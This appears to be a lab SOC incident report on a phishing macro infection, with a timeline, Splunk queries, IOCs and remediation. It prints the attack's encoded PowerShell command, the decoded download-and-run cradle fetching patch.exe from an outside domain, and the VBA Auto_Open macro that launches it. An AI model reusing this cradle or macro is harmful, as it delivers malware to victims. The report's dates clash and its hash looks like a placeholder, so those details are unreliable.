# Investigation 002: Malware Execution via Malicious Macro

## Alert Details

- **Date:** 2025-10-18
- **Alert Source:** Splunk SIEM
- **Alert Name:** Suspicious Process - Excel Spawned PowerShell
- **Severity:** Critical
- **MITRE ATT&CK:** Execution — User Execution: Malicious File (T1204.002)
- **Affected Host:** WS-FIN-PC01 (10.0.0.15 - Finance Workstation)
- **Affected User:** a.chen (Finance Department)
- **C2 Server:** 91.215.85.17:443
- **Malicious Domain:** cdn-update[.]xyz

## Executive Summary

A Finance Department user opened a malicious macro-enabled Excel file that initiated a multi-stage malware infection. The attack chain began with an email attachment containing an invoice-themed spreadsheet with embedded VBA macros. Upon enabling macros, Excel spawned PowerShell to download and execute a remote payload from a compromised infrastructure. The malware established persistence through a scheduled task and initiated command-and-control beaconing. Early detection and rapid containment prevented lateral movement and data exfiltration. The workstation was isolated and reimaged.

## Timeline of Events

| Time (UTC) | Event | Source | Details |
|------------|-------|--------|---------|
| 2026-01-18 10:42:15 | Email Received | Email Gateway Logs | Email from "billing@invoice-central[.]com" with attachment "Q4_Report_Final.xlsm" delivered to a.chen |
| 2026-01-18 10:45:33 | File Opened | Sysmon (Event 1) | EXCEL.EXE (PID 4852) opened Q4_Report_Final.xlsm from Downloads folder |
| 2026-01-18 10:46:08 | Macro Execution | Office Audit Log | User clicked "Enable Content" - macros activated |
| 2026-01-18 10:46:11 | Suspicious Process Creation | Sysmon (Event 1) | EXCEL.EXE spawned cmd.exe (PID 5124) - anomalous parent-child relationship detected |
| 2026-01-18 10:46:12 | PowerShell Spawned | Sysmon (Event 1) | cmd.exe spawned powershell.exe with encoded command parameter |
| 2026-01-18 10:46:15 | Network Connection | Sysmon (Event 3) | PowerShell established HTTPS connection to cdn-update[.]xyz (91.215.85.17:443) |
| 2026-01-18 10:46:18 | File Download | Sysmon (Event 11) | File "patch.exe" (12.3 MB) written to C:\Users\a.chen\AppData\Local\Temp\ |
| 2026-01-18 10:46:22 | Malware Execution | Sysmon (Event 1) | patch.exe executed from Temp directory (PID 5340) |
| 2026-01-18 10:46:28 | Scheduled Task Created | Sysmon (Event 1) / Security (Event 4698) | schtasks.exe created task "SystemUpdateCheck" for persistence |
| 2026-01-18 10:46:35 | File Copy to System Directory | Sysmon (Event 11) | patch.exe copied to C:\ProgramData\Windows\UpdateService\svchost32.exe |
| 2026-01-18 10:46:42 | C2 Beacon Initiated | Sysmon (Event 3) | svchost32.exe established connection to 91.215.85.17:443 - repeated beacons every 60 seconds |
| 2026-01-18 10:47:05 | Registry Modification | Sysmon (Event 13) | Run key added: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate |
| 2026-01-18 10:48:19 | **Alert Fired** | Splunk Alert | Detection rule "Office Application Spawned PowerShell" triggered |
| 2026-01-18 10:49:30 | Analyst Response Begin | SOC Action Log | T2 analyst began investigation |
| 2026-01-18 10:52:45 | Host Isolation | Network ACL | WS-FIN-PC01 isolated from network via switch port shutdown |
| 2026-01-18 10:54:12 | Firewall Block | Perimeter Firewall | IP 91.215.85.17 blocked at firewall |
| 2026-01-18 11:02:00 | Incident Escalated | SOC Manager | Escalated to Senior Analyst - confirmed malware infection |
| 2026-01-18 11:15:30 | Containment Complete | SOC Action Log | All C2 communication terminated, host quarantined |

## Investigation Steps

### Step 1: Initial Alert Triage

**Alert Triggered:** Splunk detection rule "Office Application Spawned PowerShell" fired at 10:48:19 UTC.

**Alert Details:**
```
Source Host: WS-FIN-PC01 (10.0.0.15)
User: a.chen
Parent Process: EXCEL.EXE (PID 4852)
Child Process: powershell.exe (PID 5216)
Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGMALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAGMAZABuAC0AdQBwAGQAYQB0AGUALgB4AHkAegAvAHAAYQB0AGMAaAAuAGUAeABlACIALAAiAEMAOgBcAFUAcwBlAHIAcwBcAGEALgBjAGgAZQBuAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABwAGEAdABjAGgALgBlAHgAZQAiACkAOwBzAHQAYQByAHQALQBwAHIAbwBjAGUAcwBzACAAIgBDADoAXABVAHMAZQByAHMAXABhAC4AYwBoAGUAbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAcABhAHQAYwBoAC4AZQB4AGUAIgA=
File: Q4_Report_Final.xlsm
```

**Initial Assessment:** Critical severity due to:
- Office application spawning PowerShell (classic macro attack behavior)
- Encoded PowerShell command (obfuscation technique)
- ExecutionPolicy Bypass parameter
- Finance user handling financial documents (common phishing target)

**Base64 Decoded Command:**
```powershell
$c=new-object net.webclient;$c.downloadfile("https://cdn-update.xyz/patch.exe","C:\Users\a.chen\AppData\Local\Temp\patch.exe");start-process "C:\Users\a.chen\AppData\Local\Temp\patch.exe"
```

**Analysis:** Clear malware dropper downloading payload from external domain.

### Step 2: Process Tree Analysis

**Query: Reconstruct full process execution chain**
```spl
index=windows_sysmon host="WS-FIN-PC01" earliest="2025-10-18T10:45:00" latest="2025-10-18T11:00:00"
| search EventCode=1 OR EventCode=3 OR EventCode=11
| eval process_chain=parent_process_name + " -> " + process_name
| table _time, EventCode, parent_process_name, process_name, CommandLine, DestinationIp, TargetFilename
| sort _time
```

**Process Tree Identified:**
```
EXCEL.EXE (PID 4852)
├── cmd.exe (PID 5124)
│   └── powershell.exe (PID 5216) [EncodedCommand]
│       └── patch.exe (PID 5340)
│           ├── schtasks.exe (PID 5388) [Created scheduled task]
│           └── svchost32.exe (PID 5472) [Renamed copy - persistence]
```

**Key Findings:**
- Abnormal process chain originating from Office application
- Multiple persistence mechanisms deployed
- Process masquerading (patch.exe renamed to svchost32.exe to blend in)

### Step 3: Network Traffic Analysis

**Query: Identify all network connections from compromised host**
```spl
index=windows_sysmon host="WS-FIN-PC01" EventCode=3 earliest="2025-10-18T10:45:00"
| table _time, Image, DestinationIp, DestinationPort, DestinationHostname
| sort _time
```

**Network Connections Identified:**

| Time | Process | Destination | Port | Purpose |
|------|---------|-------------|------|---------|
| 10:46:15 | powershell.exe | 91.215.85.17 (cdn-update[.]xyz) | 443 | Initial payload download |
| 10:46:42 | svchost32.exe | 91.215.85.17 | 443 | C2 beacon (initial) |
| 10:46:43 | svchost32.exe | 91.215.85.17 | 443 | C2 beacon |
| 10:47:43 | svchost32.exe | 91.215.85.17 | 443 | C2 beacon (60s interval) |
| 10:48:43 | svchost32.exe | 91.215.85.17 | 443 | C2 beacon (60s interval) |

**Analysis:**
- Consistent beaconing to single C2 server every 60 seconds
- HTTPS used to encrypt C2 traffic (SSL inspection showed self-signed certificate)
- No lateral movement attempts detected
- No data exfiltration observed before containment

**DNS Query Analysis:**
```spl
index=dns host="WS-FIN-PC01" query="cdn-update.xyz" earliest="2025-10-18T10:45:00"
| table _time, query, answer
```

**Result:** 
- cdn-update[.]xyz resolved to 91.215.85.17
- Domain registered 2025-10-10 (8 days old - newly registered)
- Registrar: NameCheap (privacy-protected WHOIS)

### Step 4: Malware Analysis & IOC Extraction

**File Retrieval:**
- patch.exe retrieved from quarantine
- svchost32.exe copy retrieved from C:\ProgramData\Windows\UpdateService\

**Static Analysis:**

**File: patch.exe**
```
SHA256: 7f3c2e8d9a1b4f5c6e7d8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d
Size: 12,854,272 bytes
File Type: PE32 executable (GUI) Intel 80386, for MS Windows
Compiler: Microsoft Visual C++ 2019
Packed: Yes (UPX detected)
Entropy: 7.89 (high - indicates encryption/packing)
```

**VirusTotal Results:**
- 47/72 antivirus engines detected as malicious
- Classification: Trojan.GenericKD, Agent.Tesla, Formbook
- Known families: Information stealer, keylogger, RAT capabilities

**Scheduled Task Analysis:**
```spl
index=windows_security EventCode=4698 host="WS-FIN-PC01" earliest="2025-10-18T10:46:00"
| table _time, Task_Name, Task_Command, Task_Trigger
```

**Scheduled Task Details:**
```xml
Task Name: SystemUpdateCheck
Action: C:\ProgramData\Windows\UpdateService\svchost32.exe
Trigger: At log on of any user
Author: WS-FIN-PC01\a.chen
```

**Registry Persistence:**
```spl
index=windows_sysmon EventCode=13 host="WS-FIN-PC01" earliest="2025-10-18T10:46:00"
| table _time, TargetObject, Details
```

**Registry Modifications:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
Value: C:\ProgramData\Windows\UpdateService\svchost32.exe
```

### Step 5: Email Investigation & Attack Vector

**Query: Analyze delivery email**
```spl
index=email recipient="a.chen@soclab.local" earliest="2025-10-18T10:40:00" latest="2025-10-18T10:45:00"
| table _time, sender, subject, attachment_name, sender_ip
```

**Email Details:**
```
From: billing@invoice-central[.]com
Subject: RE: Q4 Financial Report - URGENT
Received: 2025-10-18 10:42:15 UTC
Sender IP: 198.54.117.200
Attachment: Q4_Report_Final.xlsm (327 KB)
SPF: Fail (sender IP not authorized)
DKIM: None
DMARC: None
```

**Email Content:**
```
Dear Finance Team,

Please review the attached Q4 financial report immediately. 
The CFO requires this to be completed by end of day.

Attached: Q4_Report_Final.xlsm

Regards,
Accounts Payable Department
```

**Social Engineering Analysis:**
- Urgency tactic ("URGENT", "immediately", "end of day")
- Authority reference (CFO)
- Legitimate-looking file name matching job function
- Reply format in subject line (RE:) to appear as existing conversation

**Macro Analysis (VBA Code Excerpt):**
```vba
Sub Auto_Open()
    Dim cmd As String
    cmd = "cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & _
          "JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQA..."
    Shell cmd, vbHide
End Sub
```

**Macro Behavior:**
- Auto-executes on document open (Auto_Open)
- Spawns cmd.exe with hidden window
- Executes PowerShell download cradle
- No obfuscation in VBA (basic attack)

## Indicators of Compromise (IOCs)

| Type | Value | Source | Verdict |
|------|-------|--------|---------|
| SHA256 | 7f3c2e8d9a1b4f5c6e7d8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d | Sysmon File Hash | Malicious - patch.exe/svchost32.exe |
| IPv4 | 91.215.85.17 | Sysmon Network | Malicious - C2 server |
| Domain | cdn-update[.]xyz | DNS Logs | Malicious - Payload hosting |
| IPv4 | 198.54.117.200 | Email Gateway | Suspicious - Phishing sender IP |
| Email | billing@invoice-central[.]com | Email Headers | Malicious - Phishing sender |
| File | Q4_Report_Final.xlsm | Email Attachment | Malicious - Macro dropper |
| Registry Key | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate | Sysmon Event 13 | Malicious - Persistence |
| Scheduled Task | SystemUpdateCheck | Windows Security Event 4698 | Malicious - Persistence |
| File Path | C:\ProgramData\Windows\UpdateService\svchost32.exe | Sysmon Event 11 | Malicious - Malware persistence location |

## Verdict

**True Positive — Confirmed Macro-Based Malware Infection**

**Confidence Level:** Very High (100%)

**Evidence:**
1. Documented execution chain from malicious macro to malware deployment
2. Network communication to known-malicious C2 infrastructure
3. Multiple persistence mechanisms established
4. File hash confirmed malicious by 47 AV engines
5. Clear phishing email delivery with social engineering indicators
6. Failed email authentication (SPF Fail)

**Attack Success:** Partial
- Initial infection successful (macro executed, malware deployed)
- Persistence established (scheduled task + registry)
- C2 communication initiated
- However, detected before lateral movement
- No data exfiltration occurred
- No additional systems compromised
- Rapid containment prevented attacker objectives

**Malware Family:** Likely Agent Tesla or Formbook variant (information stealer with keylogging and RAT capabilities)

## Response Actions Taken

### Immediate Containment (10:49 - 10:54 UTC)

1. **Host Isolation**
   ```powershell
   # Isolated host via network switch port shutdown
   # Prevented lateral movement and C2 communication
   ```

2. **Firewall Block**
   ```
   Blocked IP: 91.215.85.17
   Blocked Domain: cdn-update.xyz
   Rule: Global deny at perimeter firewall
   ```

3. **Email Quarantine**
   ```
   # Quarantined all emails matching indicators
   Subject contains: "Q4 Financial Report"
   Sender: billing@invoice-central[.]com
   Attachment: *.xlsm
   Action: 3 additional emails quarantined from user mailboxes
   ```

4. **User Account Security**
   ```powershell
   # Reset password for a.chen
   Set-ADAccountPassword -Identity "a.chen" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "ComplexP@ssw0rd123!" -Force)
   
   # Revoked all active sessions
   Revoke-ADUserSession -Identity "a.chen"
   ```

### Eradication (Same Day)

5. **Malware Removal**
   ```powershell
   # Workstation reimaged from clean baseline
   # File system analysis showed no additional persistence
   # Scheduled task removed
   Remove-ScheduledTask -TaskName "SystemUpdateCheck" -Confirm:$false
   
   # Registry persistence removed
   Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate"
   
   # Malware files deleted
   Remove-Item "C:\ProgramData\Windows\UpdateService\" -Recurse -Force
   Remove-Item "C:\Users\a.chen\AppData\Local\Temp\patch.exe" -Force
   ```

6. **Forensic Collection**
   ```powershell
   # Memory dump collected before wipe
   DumpIt.exe /OUTPUT D:\Forensics\WS-FIN-PC01_20251018.dmp
   
   # Disk image created
   FTK Imager - Full disk forensic image acquired
   
   # Event logs exported
   wevtutil epl Security D:\Forensics\Security.evtx
   wevtutil epl System D:\Forensics\System.evtx
   ```

7. **System Rebuild**
   - Workstation reimaged with latest Windows 10 Enterprise baseline
   - All software reinstalled from approved sources
   - Security configurations applied via Group Policy
   - Endpoint protection updated and scanned clean

### Recovery & Hardening (10:54 - 14:00 UTC)

8. **Enhanced Email Security**
   ```
   # Updated email gateway rules
   - Block all .xlsm attachments from external senders
   - Quarantine emails failing SPF/DKIM/DMARC
   - Enhanced attachment sandboxing for Office documents
   - Added cdn-update[.]xyz to DNS blacklist
   ```

9. **User Training**
   - a.chen provided immediate security awareness coaching
   - Reviewed phishing indicators with user
   - Documented user statement: "Email looked legitimate, appeared to be from internal team"
   - Mandatory phishing training assigned to all Finance department

10. **Endpoint Hardening**
    ```powershell
    # Disabled macros via Group Policy for all users except approved
    Set-GPRegistryValue -Name "Office Macro Policy" -Key "HKCU\Software\Policies\Microsoft\Office\16.0\excel\security" -ValueName "VBAWarnings" -Type DWord -Value 4
    
    # Enabled Attack Surface Reduction (ASR) rules
    Add-MpPreference -AttackSurfaceReductionRules_Ids 92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B -AttackSurfaceReductionRules_Actions Enabled
    # (Block Office applications from creating executable content)
    
    Add-MpPreference -AttackSurfaceReductionRules_Ids 7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C -AttackSurfaceReductionRules_Actions Enabled
    # (Block Office applications from creating child processes)
    ```

11. **Enhanced Detection**
    ```spl
    # New Splunk alert: Block Office + PowerShell execution
    index=windows_sysmon EventCode=1 parent_process_name IN ("EXCEL.EXE", "WINWORD.EXE", "POWERPNT.EXE") process_name IN ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe")
    | stats count by host, user, parent_process_name, process_name, CommandLine
    | where count > 0
    ```

12. **Threat Hunt**
    ```spl
    # Hunt for similar activity across all endpoints
    index=windows_sysmon EventCode=3 DestinationIp="91.215.85.17"
    | stats values(host) as affected_hosts by user
    ```
    **Result:** No additional compromised hosts identified.

## MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID | Evidence |
|--------|-----------|-------------|----------|
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | Malicious Excel file delivered via email to Finance user |
| Execution | User Execution: Malicious File | T1204.002 | User opened Q4_Report_Final.xlsm and enabled macros |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Macro spawned PowerShell to download payload |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | SystemUpdateCheck task created for persistence |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | HKCU Run key added for persistence |
| Defense Evasion | Obfuscated Files or Information: Command Obfuscation | T1027.010 | Base64-encoded PowerShell command |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036 | Malware renamed to svchost32.exe to blend in |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | C2 communication over HTTPS to cdn-update[.]xyz |
| Command and Control | Ingress Tool Transfer | T1105 | Downloaded patch.exe from remote server |

## Lessons Learned

### What Went Well
- Detection rule triggered within 2 minutes of malware execution
- Process tree analysis quickly identified full attack chain
- Rapid host isolation prevented lateral movement
- Comprehensive logging enabled full incident reconstruction
- User cooperation during investigation

### What Could Be Improved
- **Email Security:** Malicious attachment bypassed email gateway despite failed SPF
- **User Awareness:** Finance user enabled macros without verification
- **Macro Policy:** No GPO restriction on macro execution for end users
- **Attachment Filtering:** .xlsm files not blocked from external senders
- **EDR Coverage:** No application whitelisting to prevent unauthorized executables

### Actions Taken Post-Incident
1. ✅ Blocked all macro-enabled Office files from external email
2. ✅ Deployed Attack Surface Reduction (ASR) rules blocking Office child processes
3. ✅ Implemented macro restriction via GPO (allow only signed macros)
4. ✅ Enhanced email authentication enforcement (reject SPF/DKIM failures)
5. ✅ Mandatory phishing training for all Finance department staff
6. ✅ Deployed application whitelisting (AppLocker) on Finance workstations
7. ✅ Enhanced DNS filtering with malware domain feeds
8. ✅ Implemented email attachment sandboxing (detonate before delivery)
9. ✅ Updated incident response playbook for macro malware
10. ✅ Scheduled quarterly phishing simulations

### New Detection Rules Created
- Alert on Office applications spawning PowerShell, cmd, or scripting engines
- Alert on PowerShell with -EncodedCommand or -ExecutionPolicy Bypass parameters
- Alert on scheduled task creation with non-admin users
- Alert on file writes to C:\ProgramData by Office applications
- Alert on network connections from Office applications to external IPs

### Metrics
- **Mean Time to Detect (MTTD):** 2 minutes 8 seconds (macro execution to alert)
- **Mean Time to Contain (MTTC):** 6 minutes 26 seconds (alert to host isolation)
- **Total Incident Duration:** 26 minutes 11 seconds (initial compromise to full containment)
- **Systems Affected:** 1 (WS-FIN-PC01)
- **Accounts Compromised:** 1 (a.chen)
- **Data Exfiltrated:** 0 bytes (prevented)
- **Lateral Movement:** None detected
- **Business Impact:** Minimal (one workstation offline 4 hours for reimaging)

### Follow-up Actions
- [ ] Submit malware sample to national CERT for IOC sharing
- [ ] Threat intelligence report distributed to ISAC partners
- [ ] Quarterly review of email security controls
- [ ] Monthly testing of ASR rules effectiveness
- [ ] Implement Microsoft Defender for Office 365 (Safe Attachments)
